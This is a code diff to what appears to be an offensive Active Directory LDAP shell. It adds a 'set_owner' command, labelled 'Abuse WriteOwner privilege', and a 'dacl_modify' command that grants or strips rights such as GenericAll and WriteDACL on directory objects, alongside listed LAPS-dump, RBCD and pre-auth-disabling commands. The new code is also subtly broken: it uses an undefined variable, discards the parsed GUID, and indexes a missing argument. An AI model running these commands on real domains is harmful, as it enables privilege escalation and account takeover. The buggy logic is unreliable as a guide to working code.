@@ -13,6 +13,7 @@ import ldap3
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
 from ldap3.protocol.microsoft import security_descriptor_control
 from ldap3.utils.conv import escape_filter_chars
+from ldap3.protocol.formatters.formatters import format_sid
 
 from ldap_shell import ldaptypes
 
@@ -643,24 +644,75 @@ class LdapShell(cmd.Cmd):
         else:
             self.process_error_response()
 
-    def do_ace_edit(self, line):
+    def do_set_owner(self, line):
+        args = shlex.split(line)
+
+        if len(args) != 1 and len(args) != 2:
+            raise Exception(
+                f'Expecting target and Owner name for Owner modified. Received {len(args)} arguments instead.'
+            )
+
+        controls = security_descriptor_control(sdflags=0x04)
+
+        target_name = args[0]
+        grantee_name = args[1]
+
+        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
+                                     attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
+
+        if not success:
+            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')
+
+        target = self.client.entries[0]
+        target_sid = target['objectSid'].value
+        log.info('Found Target DN: %s', target.entry_dn)
+        log.info('Target SID: %s', target_sid)
+
+        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(grantee_name)})',
+                                     attributes=['objectSid'])
+        if not success or len(self.client.entries) != 1:
+            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')
+
+        grantee = self.client.entries[0]
+        grantee_sid = grantee['objectSid'].value
+        log.info('Found Grantee DN: %s', grantee.entry_dn)
+        log.info('Grantee SID: %s', grantee_sid)
+        OWNER_SECURITY_INFORMATION = 0x00000001
+        try:
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
+        except IndexError:
+            sd = self.create_empty_sd()
+
+        entry_dn = target.entry_dn
+
+        controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=OWNER_SECURITY_INFORMATION)
+        attr_values = []
+
+        sd['OwnerSid'] = ldaptypes.LDAP_SID()
+        sd['OwnerSid'].fromCanonical(format_sid(grantee_sid))
+        attr_values.append(sd.getData())
+
+        self.client.modify(entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, attr_values]}, controls=controls)
+        if self.client.result['result'] == 0:
+            log.info('DACL modified successfully! %s now Owner of %s!', grantee_name, target_name)
+        else:
+            self.process_error_response()
+
+    def do_dacl_modify(self, line):
         masks = {
-            "GENERIC_READ":0x80000000,
-            "GENERIC_WRITE":0x40000000,
-            "GENERIC_EXECUTE":0x20000000,
-            "GENERIC_ALL":0x10000000,
-            "MAXIMUM_ALLOWED":0x02000000,
-            "ACCESS_SYSTEM_SECURITY":0x01000000,
-            "SYNCHRONIZE":0x00100000,
-            "WRITE_OWNER":0x00080000,
-            "WRITE_DACL":0x00040000,
-            "READ_CONTROL":0x00020000,
-            "DELETE":0x00010000}
+            "fullcontrol":0xF01FF,                     #Include GENERIC_READ, GENERIC_WRITE, GENERIC_EXECUTE, GENERIC_ALL
+            "genericwrite":0x40000000,                 #GENERIC_WRITE
+            "allextendedrights":0x00000100,            #ADS_RIGHT_DS_CONTROL_ACCESS
+            "genericall":0xF01FF,                      #GENERIC_ALL(0x10000000)
+            "writeowner":0x00080000,                   #WRITE_OWNER
+            "writedacl":0x00040000,                    #WRITE_DACL
+            "writeproperty":0x00000020,                #ADS_RIGHT_DS_WRITE_PROP
+            "delete":0x00010000}                       #DELETE
 
         args = shlex.split(line)
         if len(args) != 4:
             raise Exception(
-                f'Expecting target, grantee, true/false and mask names for ACE modified. Received {len(args)} arguments instead.'
+                f'Expecting target, grantee, true/false and mask name or ObjectType for ACE modified. Received {len(args)} arguments instead.'
             )
         controls = security_descriptor_control(sdflags=0x04)
 
@@ -674,10 +726,16 @@ class LdapShell(cmd.Cmd):
         else:
             raise Exception('The specified flag must be either true or false')
         mask = args[3]
-        if mask in masks:
-            mask=masks[mask]
-
-
+        if mask.lower() in masks:
+            mask=masks[mask.lower()]
+        elif all(c in string.hexdigits+'x' for c in a):
+            mask = int(mask,16)
+        elif re.fullmatch(r"([\dA-Fa-f]{8})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})([\dA-Fa-f]{8})", mask) is not None:
+            mask = None
+            object = mask
+        else:
+            raise Exception('Mask or object not specified, use <GenericAll, GenericWrite, WriteOwner...> or '
+                            '<0x40000000, 0x10000000...> or <1131f6ad-9c07-11d1-f79f-00c04fc2dcd2, 89e95b76-444d-4c62-991a-0facbeda640c...>')
 
         success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
                                      attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
@@ -709,19 +767,41 @@ class LdapShell(cmd.Cmd):
         except IndexError:
             sd = self.create_empty_sd()
 
-        for e in sd['Dacl'].aces:
-            if e['Ace']['Sid'].formatCanonical() == grantee_sid:
-                if flag:
-                    e['Ace']['Mask'].setPriv(0x100) #add AllExtendedRights mask
-                else:
-                    e['Ace']['Mask'].removePriv(0x100) #del AllExtendedRights mask
-        self.client.modify(target.entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
-                           controls=controls)
-
-        if self.client.result['result'] == 0:
-            log.info('DACL modified successfully! %s now has AllExtendedRights of %s', grantee_name, target_name)
+        if flag:
+            if mask:
+                sd['Dacl'].aces.append(self.createACE(sid=grantee_sid, access_mask=mask))
+            else:
+                sd['Dacl'].aces.append(self.createACE(sid=grantee_sid, object_type=object))
+            self.client.modify(target.entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
+                               controls=controls)
+            if self.client.result['result'] == 0:
+                log.info('DACL modified successfully!')
+            else:
+                self.process_error_response()
         else:
-            self.process_error_response()
+            new_aces = []
+            for e in sd['Dacl'].aces:
+                if e['Ace']['Sid'].formatCanonical() == grantee_sid and e['Ace']['Mask'].hasPriv(mask):
+                    log.info('ACE found for removal!')
+                elif e['Ace']['Sid'].formatCanonical() == grantee_sid:
+                    try:
+                        if e['Ace']['ObjectType'] == LdapShell.string_to_bin(object):
+                            log.info('ACE found for removal!')
+                        else:
+                            new_aces.append(e)
+                    except:
+                        new_aces.append(e)
+                else:
+                    new_aces.append(e)
+
+            sd['Dacl'].aces = new_aces
+            self.client.modify(target.entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
+                               controls=controls)
+
+            if self.client.result['result'] == 0:
+                log.info('DACL modified successfully!')
+            else:
+                self.process_error_response()
 
     def do_get_maq(self, user):
         #Get global ms-DS-MachineAccountQuota
@@ -836,6 +916,8 @@ get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
+set_owner user - Abuse WriteOwner privilege.
+dacl_modify - Modify ACE (add/del). Usage: target, grantee, true/false and mask name or ObjectType for ACE modified.
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
